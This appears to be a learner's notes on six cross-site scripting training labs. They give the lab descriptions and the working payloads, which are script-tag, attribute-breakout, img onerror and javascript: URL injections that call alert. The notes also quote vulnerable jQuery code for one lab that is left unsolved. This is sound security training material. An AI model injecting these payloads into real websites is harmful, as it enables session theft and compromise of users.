
# Lab 1

## Description

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Very easy:

```
/?search=hello<script>alert(1)</script>
```

# Lab 2

## Description

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

## Solution

Commenting:

```
<script>alert(1)</script>
```

solves the lab -> very easy

# Lab 3

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Same as `Lab 1` but the `input` tag needs to be closed:

```
/?search=werwer"><script>alert(1)</script>
```

# Lab 4

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Payload from `Lab 3` didn't trigger, using a simple bypass solves this:

```
/?search=werewr%27"><img+src=x+onerror=alert(1)>
```

A closing `</div>` tag could maybe do the trick given there is no filtering in place? -> to be tested for knowledge.

# Lab 5

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

## Solution

Was too tired to understand why my payloads didn't work -> used `DOM Invader`:

```
/feedback?returnPath=javascript:alert(1)
```


# Lab 6

## Description

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

## Solution

Reading HTML source code shows:

```
|<script>|
||$(window).on('hashchange', function(){|
||var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');|
||if (post) post.get(0).scrollIntoView();|
||});|
||</script>|
```

I don't understand this lab, need a break.